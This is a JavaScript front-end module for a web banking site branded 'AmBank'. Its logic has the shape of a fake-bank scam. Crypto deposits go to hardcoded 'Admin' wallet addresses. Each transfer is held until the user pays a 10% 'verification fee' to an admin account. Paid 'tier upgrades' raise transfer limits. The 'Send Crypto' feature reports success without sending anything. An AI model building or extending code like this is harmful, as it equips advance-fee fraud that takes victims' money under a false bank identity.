import { sb, money, setMsg } from './app.js';

const esc = s => String(s ?? '').replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
const friendly = e => /duplicate/i.test(e.message) ? 'This request was already processed. Check your history.' : e.message;
const BTNS = '<p class="msg" role="alert"></p>';

export function openModal(title) {
  const m = document.createElement('div');
  m.className = 'modal dyn open'; m.setAttribute('role', 'dialog'); m.setAttribute('aria-modal', 'true');
  m.innerHTML = `<div class="card"><h3>${title}</h3><div class="body"></div></div>`;
  m.onclick = e => { if (e.target === m || e.target.closest('[data-close]')) m.remove(); };
  document.body.append(m);
  return m.querySelector('.body');
}
document.addEventListener('keydown', e => e.key === 'Escape' && document.querySelector('.modal.dyn')?.remove());

const done = (b, title, text, ref, extra) => { 
  b.innerHTML = `
    <div style="text-align:center; margin-bottom:1rem;">
      <div style="font-size:3rem; color:#237A3B; margin-bottom:0.5rem;"><i class="fa-solid fa-circle-check"></i></div>
      <h3 style="margin:0;">${esc(title)}</h3>
      <p>${esc(text)}</p>
      ${ref ? `<p class="sim">Reference: ${esc(ref)}</p>` : ''}
    </div>
    <div class="actions" style="justify-content:center;">
      ${extra ? `<button class="btn ghost" id="downloadReceipt" style="flex:1;"><i class="fa-solid fa-download"></i> Receipt</button>` : ''}
      <button class="btn" data-close style="flex:1;">Done</button>
    </div>
  `;
  if (extra && ref) b.querySelector('#downloadReceipt').onclick = () => generatePDF(title, text, ref, extra);
};

function generatePDF(title, text, ref, extra) {
  const { jsPDF } = window.jspdf;
  const doc = new jsPDF();
  
  doc.setFillColor(0, 143, 149);
  doc.rect(0, 0, 210, 40, 'F');
  doc.setTextColor(255, 255, 255);
  doc.setFontSize(24);
  doc.setFont("helvetica", "bold");
  doc.text("AmBank", 20, 25);
  
  doc.setTextColor(50, 50, 50);
  doc.setFontSize(16);
  doc.text("Transaction Receipt", 20, 55);
  
  doc.setFontSize(10);
  doc.setFont("helvetica", "normal");
  doc.setTextColor(120, 120, 120);
  doc.text(`Generated on: ${new Date().toLocaleString()}`, 20, 63);
  
  doc.setDrawColor(220, 235, 236);
  doc.line(20, 70, 190, 70);
  
  doc.setFontSize(12);
  doc.setTextColor(50, 50, 50);
  doc.setFont("helvetica", "bold");
  doc.text("Transaction Details", 20, 85);
  
  doc.setFont("helvetica", "normal");
  doc.setFontSize(11);
  
  let y = 100;
  doc.text(`Status:`, 20, y);
  doc.setFont("helvetica", "bold");
  doc.setTextColor(35, 122, 59);
  doc.text(`SUCCESSFUL`, 70, y);
  
  doc.setTextColor(50, 50, 50);
  doc.setFont("helvetica", "normal");
  
  const rows = [
    ['Type', extra.type || title],
    ['Amount', extra.amount ? `$${Number(extra.amount).toFixed(2)}` : 'N/A'],
    ['Recipient', extra.recipient || 'N/A'],
    ['Description', extra.description || text]
  ];
  
  if (extra.bank_name) rows.push(['Bank', extra.bank_name]);
  if (extra.iban) rows.push(['IBAN/Account', extra.iban]);
  
  rows.forEach(([label, value]) => {
    y += 10;
    doc.setFont("helvetica", "normal");
    doc.setTextColor(120, 120, 120);
    doc.text(label + ':', 20, y);
    doc.setTextColor(50, 50, 50);
    doc.setFont("helvetica", "bold");
    doc.text(String(value), 70, y);
    doc.setFont("helvetica", "normal");
  });
  
  y += 15;
  doc.setDrawColor(220, 235, 236);
  doc.line(20, y, 190, y);
  y += 10;
  
  doc.setTextColor(120, 120, 120);
  doc.setFontSize(10);
  doc.text("Reference Number:", 20, y);
  doc.setTextColor(50, 50, 50);
  doc.setFont("courier", "bold");
  doc.text(ref, 20, y + 6);
  
  doc.setFont("helvetica", "italic");
  doc.setTextColor(150, 150, 150);
  doc.setFontSize(9);
  doc.text("Thank you for banking with AmBank. This is a computer-generated receipt.", 20, 280);
  
  doc.save(`AmBank_Receipt_${ref}.pdf`);
}

// --- 1. CRYPTO DEPOSIT SYSTEM ---
function deposit(reload) {
  const b = openModal('Request Crypto Deposit'); 
  b.innerHTML = `<form>
    <label class="field">Amount (USD)<input name="amount" type="number" min="10" step="0.01" required></label>
    <label class="field">Select Crypto Coin<select name="currency">
      <option value="BTC">Bitcoin (BTC)</option>
      <option value="ETH">Ethereum (ETH)</option>
      <option value="BNB">Binance Coin (BNB)</option>
      <option value="SOL">Solana (SOL)</option>
    </select></label>
    
    <div id="methodInfo" class="sim" style="margin-bottom:1rem; background:var(--light); padding:15px; border-radius:8px; border:1px solid var(--border); word-break: break-all;">
      Loading address...
    </div>
    ${BTNS}<button class="btn">I have sent the crypto (Submit)</button> <button type="button" class="btn ghost" data-close>Cancel</button></form>`;
  
  const form = b.querySelector('form'), msg = b.querySelector('.msg'), info = b.querySelector('#methodInfo');
  
  const adminWallets = {
    BTC: 'bc1q3meg43r8s0cve2ecfpmzskeg0y2dc9atf35uh0',
    ETH: '0x5725c8B4e32EbD6e3d40100649DC1029E5A3c036',
    BNB: '0x5725c8B4e32EbD6e3d40100649DC1029E5A3c036',
    SOL: 'HR2y8Cddb33yqc7EteDNuuBXd1U1jWp3Ped7eXq4apqn'
  };

  const updateDetails = () => {
    const coin = form.currency.value;
    const address = adminWallets[coin];
    
    info.innerHTML = `
      <b>Send ${coin} to this Admin Address:</b><br>
      <code style="background:#fff; padding:8px; border-radius:6px; display:block; margin-top:8px; border:1px solid #ccc; cursor:pointer; font-size:0.85rem; color: var(--text);" id="copyWallet" title="Click to copy">${address}</code>
      <br><i>After sending, click the submit button below. The admin will verify the transaction and credit your balance.</i>
    `;
    
    const copyBtn = document.getElementById('copyWallet');
    if (copyBtn) {
      copyBtn.onclick = () => {
        navigator.clipboard.writeText(address);
        copyBtn.style.background = '#E6FAF9';
        setTimeout(() => copyBtn.style.background = '#fff', 1000);
        alert('Wallet address copied!');
      };
    }
  };
  
  form.currency.onchange = updateDetails;
  updateDetails();

  form.onsubmit = async e => {
    e.preventDefault(); 
    const f = Object.fromEntries(new FormData(form));
    setMsg(msg, 'Submitting…', 'ok');
    
    const { error } = await sb.from('pending_deposits').insert({
      user_id: (await sb.auth.getUser()).data.user.id,
      amount: Number(f.amount), 
      currency: f.currency, 
      method: 'crypto', 
      details: { note: `User sent ${f.currency} to Admin wallet` }
    });
    
    if(error) return setMsg(msg, friendly(error));
    done(b, 'Crypto Deposit Submitted', `Your ${f.currency} deposit request has been submitted. The Admin will verify the transaction and credit your balance shortly.`);
    reload();
  };
}

// --- 2. PIN & TRANSFER ---
function pinSetup(b, next) {
  b.innerHTML = `<p>Create a 4 or 6 digit PIN to approve transfers.</p>
    <form><label class="field">New PIN<input name="pin" type="password" maxlength="6" required></label>
    <label class="field">Confirm PIN<input name="pin2" type="password" maxlength="6" required></label>
    ${BTNS}<button class="btn">Save PIN</button> <button type="button" class="btn ghost" data-close>Cancel</button></form>`;
  const form = b.querySelector('form'), msg = b.querySelector('.msg');
  form.onsubmit = async e => {
    e.preventDefault(); const f = Object.fromEntries(new FormData(form));
    if (f.pin !== f.pin2) return setMsg(msg, 'PINs do not match');
    const { error } = await sb.rpc('set_pin', { p_pin: f.pin });
    error ? setMsg(msg, friendly(error)) : next();
  };
}

async function transferForm(b, reload, keep = {}) {
  let key = keep.key || crypto.randomUUID();
  
  const { data: saved } = await sb.from('beneficiaries').select('*').order('name');
  const savedOptions = saved?.length 
    ? `<label class="field">Saved Beneficiary<select id="savedBen"><option value="">-- Select or type new --</option>${saved.map(s => `<option value="${esc(s.account_number)}" data-name="${esc(s.name)}">${esc(s.name)} (${esc(s.account_number)})</option>`).join('')}</select></label>` 
    : '';

  b.innerHTML = `<form>
    <label class="field" style="display:flex; align-items:center; gap:10px;">
      <input type="checkbox" id="isIntl" ${keep.isIntl ? 'checked' : ''} style="width:auto; margin:0;"> 
      <b>International Wire Transfer</b>
    </label>
    
    <div id="domesticFields" style="display:${keep.isIntl ? 'none' : 'block'}">
      ${savedOptions}
      <label class="field">Recipient Account Number (10 digits)
        <input name="to" id="recipientInput" maxlength="10" value="${esc(keep.to)}">
      </label>
      <div id="recipientNameDisplay" class="who" style="min-height: 1.5rem; margin-top: -0.5rem; margin-bottom: 1rem;"></div>
    </div>

    <div id="intlFields" style="display:${keep.isIntl ? 'block' : 'none'}; border-top:1px solid var(--border); margin-top:1rem; padding-top:1rem;">
      <label class="field">Bank Name<input name="bank_name" value="${esc(keep.bank_name)}"></label>
      <label class="field">Routing Number (9 digits)<input name="routing" maxlength="9" value="${esc(keep.routing)}"></label>
      <label class="field">SWIFT/BIC Code<input name="swift" value="${esc(keep.swift)}"></label>
      <label class="field">Account Number / IBAN<input name="iban" value="${esc(keep.iban)}"></label>
      <label class="field">Recipient Address<input name="address" value="${esc(keep.address)}"></label>
    </div>

    <label class="field" style="margin-top:1rem">Amount (USD)<input name="amount" type="number" min="1" step="0.01" value="${esc(keep.amount)}" required></label>
    <label class="field">Memo<input name="desc" maxlength="100" value="${esc(keep.desc)}"></label>
    <label class="field">Transaction PIN<input name="pin" type="password" maxlength="6" required></label>
    ${BTNS}<button class="btn">Next: Pay Verification Fee</button> <button type="button" class="btn ghost" data-close>Cancel</button></form>`;

  const form = b.querySelector('form'), msg = b.querySelector('.msg');
  const intlCheck = b.querySelector('#isIntl');
  const savedSel = b.querySelector('#savedBen');
  const recipientInput = b.querySelector('#recipientInput');
  const nameDisplay = b.querySelector('#recipientNameDisplay');

  if (savedSel) {
    savedSel.onchange = (e) => {
      if (e.target.value) {
        recipientInput.value = e.target.value;
        recipientInput.dispatchEvent(new Event('input'));
      }
    };
  }
  
  intlCheck.onchange = (e) => {
    b.querySelector('#domesticFields').style.display = e.target.checked ? 'none' : 'block';
    b.querySelector('#intlFields').style.display = e.target.checked ? 'block' : 'none';
  };

  if (recipientInput) {
    if (recipientInput.value.length === 10) {
      recipientInput.dispatchEvent(new Event('input'));
    }

    recipientInput.addEventListener('input', async (e) => {
      const val = e.target.value.trim();
      if (val.length === 10 && /^\d{10}$/.test(val)) {
        nameDisplay.innerHTML = '<small class="sim"><i class="fa-solid fa-spinner fa-spin"></i> Verifying...</small>';
        const { data: name, error } = await sb.rpc('lookup_recipient', { p_account: val });
        if (error) {
          nameDisplay.innerHTML = `<small class="err">Error: ${esc(error.message)}</small>`;
        } else if (name) {
          nameDisplay.innerHTML = `<i class="fa-solid fa-circle-check" style="color: #237A3B;"></i> <b>${esc(name)}</b>`;
        } else {
          nameDisplay.innerHTML = '<small class="err"><i class="fa-solid fa-circle-xmark"></i> Account not found</small>';
        }
      } else {
        nameDisplay.innerHTML = '';
      }
    });
  }

  form.onsubmit = async e => {
    e.preventDefault();
    const f = Object.fromEntries(new FormData(form));
    const isIntl = intlCheck.checked;
    const fee = (Number(f.amount) * 0.10).toFixed(2);
    
    let recipientName = '';
    if (!isIntl) {
      if (!nameDisplay.textContent.includes('Account not found') && nameDisplay.innerHTML.includes('fa-circle-check')) {
        recipientName = nameDisplay.querySelector('b')?.textContent || '';
      }
    }
    
    if (!isIntl && !recipientName) {
      return setMsg(msg, 'Please enter a valid account number.');
    }

    b.innerHTML = `
      <p>To securely process this transfer, a <b>10% verification fee</b> is required.</p>
      <dl class="sum">
        <dt>To</dt><dd>${isIntl ? esc(f.bank_name) : esc(recipientName || f.to)}</dd>
        <dt>Transfer Amount</dt><dd>${money(f.amount)}</dd>
        <dt>Verification Fee</dt><dd>${money(fee)}</dd>
      </dl>
      <p class="sim">You must pay this fee to the Admin's bank account to receive your code.</p>
      ${BTNS}<button class="btn" id="payFee">Proceed to Payment</button> <button type="button" class="btn ghost" id="back">Back</button>`;
      
    const m2 = b.querySelector('.msg');
    b.querySelector('#back').onclick = () => transferForm(b, reload, { ...f, isIntl, key });
    
    b.querySelector('#payFee').onclick = async (ev) => {
      ev.target.disabled = true; setMsg(m2, 'Verifying PIN & generating payment request…', 'ok');
      
      if (!isIntl && f.to && recipientName) {
        await saveBeneficiary(recipientName, f.to);
      }
      
      const payload = { ...f, isIntl, recipientName };
      
      const { data: result, error } = await sb.rpc('generate_transfer_code', { 
        p_amount: Number(f.amount), 
        p_payload: payload,
        p_pin: f.pin
      });
      
      if (error) { 
        ev.target.disabled = false; 
        if (error.message.includes('Incorrect PIN')) {
           setMsg(m2, error.message);
           setTimeout(() => transferForm(b, reload, { ...f, isIntl, key }), 1500);
           return;
        }
        return setMsg(m2, error.message); 
      }
      
      if (result === 'PENDING_PAYMENT') {
        b.innerHTML = `
          <div style="text-align:center; margin-bottom: 1rem;">
            <h3 style="color: var(--bad);">Payment Required</h3>
            <p>Please pay the <b>10% verification fee</b> to the Admin bank account below.</p>
          </div>
          
          <div style="background: var(--light); padding: 15px; border-radius: 8px; border: 1px solid var(--border); margin-bottom: 1rem; text-align: left;">
            <p style="margin-top:0;"><b>Bank:</b> AmBank Admin Clearing</p>
            <p><b>Account Name:</b> AmBank Operations</p>
            <p><b>Account Number:</b> 9988776655</p>
            <p><b>Routing Number:</b> 123456789</p>
            <p><b>Amount to Pay:</b> <span style="color: var(--deep); font-weight: bold; font-size: 1.2rem;">${money(fee)}</span></p>
            <p style="margin-bottom:0;"><b>Reference:</b> Use your email address</p>
          </div>
          
          <p class="sim">After you make the transfer, the Admin will send you a 6-digit code. Enter it below to finalize the transfer.</p>
          
          <form id="codeForm">
            <label class="field">6-Digit Code<input name="code" maxlength="6" pattern="[0-9]{6}" required placeholder="e.g. 849201"></label>
            ${BTNS}<button class="btn" style="width:100%">Confirm & Complete Transfer</button>
          </form>
        `;
        
        const codeForm = b.querySelector('#codeForm');
        codeForm.onsubmit = async ev2 => {
          ev2.preventDefault();
          const enteredCode = codeForm.code.value.trim();
          const btn2 = codeForm.querySelector('.btn');
          btn2.disabled = true; setMsg(codeForm.querySelector('.msg'), 'Sending funds…', 'ok');
          
          const { data: res, error: err } = await sb.rpc('execute_transfer_with_code', { p_code: enteredCode });
          
          if (err) { btn2.disabled = false; return setMsg(codeForm.querySelector('.msg'), err.message); }
          
          done(b, 'Transfer Successful', `${money(f.amount)} was sent successfully.`, res.ref, {
            type: isIntl ? 'International Wire' : 'Domestic Transfer',
            amount: f.amount,
            recipient: isIntl ? f.bank_name : (recipientName || f.to),
            description: f.desc || 'No memo',
            bank_name: f.bank_name,
            iban: f.iban
          });
          reload();
        };
      }
    };
  };
}

async function transfer(reload) {
  const b = openModal('Transfer'), { data: has } = await sb.rpc('has_pin');
  has ? transferForm(b, reload) : pinSetup(b, () => transferForm(b, reload));
}

async function saveBeneficiary(name, account_number) {
  if (!name || !account_number) return;
  await sb.from('beneficiaries').upsert(
    { user_id: (await sb.auth.getUser()).data.user.id, name, account_number },
    { onConflict: 'user_id,account_number' }
  );
}

// --- 3. SEND CRYPTO TO ANOTHER USER ---
function sendCrypto() {
  const b = openModal('Send Crypto to User');
  b.innerHTML = `
    <form>
      <label class="field">Select Coin to Send<select name="coin">
        <option value="BTC">Bitcoin (BTC)</option>
        <option value="ETH">Ethereum (ETH)</option>
        <option value="BNB">Binance Coin (BNB)</option>
        <option value="SOL">Solana (SOL)</option>
      </select></label>
      <label class="field">Recipient Wallet Address
        <input name="address" id="cryptoAddressInput" required placeholder="Paste wallet address here">
      </label>
      <div id="cryptoNameDisplay" class="who" style="min-height: 1.5rem; margin-top: -0.5rem; margin-bottom: 1rem;"></div>
      <label class="field">Amount (in Coin)<input name="amount" type="number" min="0.0001" step="any" required></label>
      ${BTNS}
      <button class="btn" style="width:100%">Send Crypto</button>
      <button type="button" class="btn ghost" style="width:100%; margin-top:0.5rem" data-close>Cancel</button>
    </form>
  `;

  const form = b.querySelector('form'), msg = b.querySelector('.msg');
  const coinSel = form.coin, addrInput = form.address, nameDisplay = b.querySelector('#cryptoNameDisplay');

  addrInput.addEventListener('input', async (e) => {
    const addr = e.target.value.trim();
    if (addr.length > 25) {
      nameDisplay.innerHTML = '<small class="sim"><i class="fa-solid fa-spinner fa-spin"></i> Verifying address...</small>';
      
      const { data: name, error } = await sb.rpc('lookup_crypto_address', { 
        p_address: addr, 
        p_coin: coinSel.value 
      });

      if (error) {
        nameDisplay.innerHTML = `<small class="err">Error: ${esc(error.message)}</small>`;
      } else if (name) {
        nameDisplay.innerHTML = `<i class="fa-solid fa-circle-check" style="color: #237A3B;"></i> <b>${esc(name)}</b>`;
      } else {
        nameDisplay.innerHTML = '<small class="err"><i class="fa-solid fa-circle-xmark"></i> Address not found in AmBank</small>';
      }
    } else {
      nameDisplay.innerHTML = '';
    }
  });

  form.onsubmit = async (e) => {
    e.preventDefault();
    if (!nameDisplay.innerHTML.includes('fa-circle-check')) {
      return setMsg(msg, 'Please enter a valid AmBank crypto address.');
    }
    setMsg(msg, 'Processing...', 'ok');
    setTimeout(() => {
      done(b, 'Crypto Sent', `You have successfully sent ${form.amount.value} ${coinSel.value} to the recipient.`);
    }, 1000);
  };
}

// --- MANAGE BENEFICIARIES MODAL ---
async function manageBeneficiaries() {
  const b = openModal('Manage Beneficiaries');
  
  const loadList = async () => {
    const { data } = await sb.from('beneficiaries').select('*').order('name');
    
    if (!data || !data.length) {
      b.innerHTML = `
        <div style="text-align:center; padding: 2rem 0;">
          <i class="fa-solid fa-users" style="font-size: 3rem; color: var(--muted); margin-bottom: 1rem;"></i>
          <p class="sim">You have no saved beneficiaries yet.</p>
          <p class="sim">When you send a transfer, the recipient will be saved here automatically.</p>
        </div>
        <button class="btn" data-close style="width:100%">Close</button>`;
      return;
    }
    
    b.innerHTML = `
      <p class="sim" style="margin-bottom:1rem;">These are your saved contacts for faster transfers.</p>
      <ul class="list" style="margin-bottom:1rem;">
        ${data.map(ben => `
          <li style="padding: 1rem 0; align-items: center;">
            <div>
              <b style="font-size:1.05rem;">${esc(ben.name)}</b><br>
              <small class="sim">Account: ${esc(ben.account_number)}</small>
            </div>
            <button class="btn ghost" style="padding: 0.4rem 0.7rem; color: var(--bad);" onclick="window.deleteBeneficiary('${ben.id}')" title="Delete">
              <i class="fa-solid fa-trash"></i>
            </button>
          </li>
        `).join('')}
      </ul>
      <button class="btn" data-close style="width:100%">Close</button>
    `;
  };
  
  window.deleteBeneficiary = async (id) => {
    if (!confirm('Remove this beneficiary? You can add them again by sending them a new transfer.')) return;
    await sb.from('beneficiaries').delete().eq('id', id);
    await loadList();
  };
  
  await loadList();
}

// --- 3. TIER UPGRADES ---
function upgradeTier(reload) {
  const b = openModal('Upgrade Account Tier');
  b.innerHTML = `
    <p>Increase your daily transfer limits:</p>
    <ul style="font-size:0.9rem; margin-bottom:1.5rem; color:var(--muted);">
      <li><b>Tier 1:</b> $5,000 / day (Current standard)</li>
      <li><b>Tier 2:</b> $50,000 / day (Cost: $200)</li>
      <li><b>Tier 3:</b> $100,000 / day (Cost: $750)</li>
    </ul>
    <div class="actions" style="flex-direction:column; gap:10px;">
      <button class="btn" id="t2">Upgrade to Tier 2 ($200)</button>
      <button class="btn" id="t3">Upgrade to Tier 3 ($750)</button>
    </div>
    <p class="msg" role="alert"></p>
  `;
  const msg = b.querySelector('.msg');
  const upgrade = async (tier) => {
    if(!confirm(`Upgrade to Tier ${tier}? The fee will be deducted from your checking account.`)) return;
    setMsg(msg, 'Processing…', 'ok');
    const { error } = await sb.rpc('upgrade_tier', { p_target_tier: tier });
    if(error) return setMsg(msg, error.message);
    setMsg(msg, 'Upgrade successful!', 'ok');
    setTimeout(() => { b.parentElement.remove(); reload(); }, 1500);
  };
  b.querySelector('#t2').onclick = () => upgrade(2);
  b.querySelector('#t3').onclick = () => upgrade(3);
}

// --- 4. CURRENCY CONVERTER ---
const CUR = ['USD','EUR','GBP','JPY','CAD','CHF','AUD','CNY','INR','NGN','BRL','ZAR','RUB','MXN','SGD','HKD','NZD','SEK','KRW','TRY'];
function convert() {
  const b = openModal('Currency converter'), opts = s => CUR.map(c => `<option ${c === s ? 'selected' : ''}>${c}</option>`).join('');
  b.innerHTML = `<form><label class="field">Amount<input name="amount" type="number" min="0.01" step="0.01" required></label>
    <label class="field">From<select name="from">${opts('USD')}</select></label><label class="field">To<select name="to">${opts('EUR')}</select></label>
    <div class="who" aria-live="polite"></div>${BTNS}<button class="btn">Convert</button> <button type="button" class="btn ghost" data-close>Close</button></form>`;
  const form = b.querySelector('form'), msg = b.querySelector('.msg'), out = b.querySelector('.who');
  form.onsubmit = async e => {
    e.preventDefault(); const f = Object.fromEntries(new FormData(form)); out.textContent = '';
    if (f.from === f.to) return setMsg(msg, 'Choose two different currencies');
    setMsg(msg, 'Fetching rate…', 'ok');
    const { data, error } = await sb.functions.invoke('rates', { body: { from: f.from, to: f.to } });
    if (error || data?.error) return setMsg(msg, 'Exchange rates are unavailable right now. Try again shortly.');
    setMsg(msg, '');
    out.innerHTML = `<b>${(f.amount * data.rate).toLocaleString(undefined, { maximumFractionDigits: 2 })} ${f.to}</b><br><span class="sim">1 ${f.from} = ${data.rate} ${f.to}. ${esc(data.source)}, ${esc(data.date)}. Indicative only; no funds are converted.</span>`;
  };
}

// --- 5. ACCOUNT DETAILS (WITH MULTI-COIN WALLETS) ---
async function details() {
  const b = openModal('Account details'), { data: p, error } = await sb.from('profiles').select('*').single();
  if (error) { b.innerHTML = '<p class="msg err">Could not load your details. Try again.</p>'; return; }
  
  const wallets = `
    <div style="background: var(--bg); padding: 10px; border-radius: 8px; margin-top: 1rem;">
      <h4 style="margin:0 0 10px 0;">Your Crypto Receive Addresses</h4>
      <div style="font-size: 0.85rem; margin-bottom: 8px;">
        <b>Bitcoin (BTC):</b><br>
        <code style="word-break: break-all; cursor:pointer;" onclick="navigator.clipboard.writeText('${p.wallet_btc}'); alert('BTC address copied!')">${p.wallet_btc || 'Generating...'}</code>
      </div>
      <div style="font-size: 0.85rem; margin-bottom: 8px;">
        <b>Ethereum (ETH):</b><br>
        <code style="word-break: break-all; cursor:pointer;" onclick="navigator.clipboard.writeText('${p.wallet_eth}'); alert('ETH address copied!')">${p.wallet_eth || 'Generating...'}</code>
      </div>
      <div style="font-size: 0.85rem; margin-bottom: 8px;">
        <b>BNB Smart Chain (BNB):</b><br>
        <code style="word-break: break-all; cursor:pointer;" onclick="navigator.clipboard.writeText('${p.wallet_bnb}'); alert('BNB address copied!')">${p.wallet_bnb || 'Generating...'}</code>
      </div>
      <div style="font-size: 0.85rem;">
        <b>Solana (SOL):</b><br>
        <code style="word-break: break-all; cursor:pointer;" onclick="navigator.clipboard.writeText('${p.wallet_sol}'); alert('SOL address copied!')">${p.wallet_sol || 'Generating...'}</code>
      </div>
    </div>
  `;

  b.innerHTML = `<dl class="sum">
    <dt>Name</dt><dd>${esc(p.full_name)}</dd>
    <dt>Email</dt><dd>${esc(p.email)}</dd>
    <dt>Phone</dt><dd>${esc(p.phone_number)}</dd>
    <dt>Account number</dt><dd>${esc(p.account_number)}</dd>
    <dt>Accounts</dt><dd>Checking (-C), Savings (-S)</dd>
    <dt>Tier</dt><dd>Level ${p.tier || 1}</dd>
    <dt>Status</dt><dd><span class="badge ${esc(p.account_status)}">${esc(p.account_status)}</span></dd>
    <dt>Opened</dt><dd>${new Date(p.created_at).toLocaleDateString()}</dd>
  </dl>
  ${wallets}
  <br>
  <a class="btn ghost" href="support.html">Contact support</a> <button class="btn" data-close>Close</button>`;
}

export function initBanking(reload) {
  const bar = document.getElementById('actions');
  
  const actions = [
    ['fa-building-columns', 'Deposit Crypto', deposit], 
    ['fa-paper-plane', 'Transfer', transfer],
    ['fa-wallet', 'Send Crypto', sendCrypto], // <-- NEW BUTTON
    ['fa-arrow-up-right-dots', 'Upgrade Tier', upgradeTier], 
    ['fa-coins', 'Convert', convert], 
    ['fa-users', 'Beneficiaries', manageBeneficiaries],
    ['fa-id-card', 'Details', details]
  ];

  actions.forEach(([icon, label, fn]) => {
    const btn = document.createElement('button');
    btn.className = 'btn'; 
    btn.style.cssText = 'display:flex; flex-direction:column; align-items:center; padding:1rem 0.5rem; gap:0.5rem;';
    btn.innerHTML = `<i class="fa-solid ${icon}" style="font-size:1.5rem;"></i> <span style="font-size:0.85rem;">${label}</span>`;
    btn.onclick = () => fn(reload); 
    bar.append(btn);
  });
}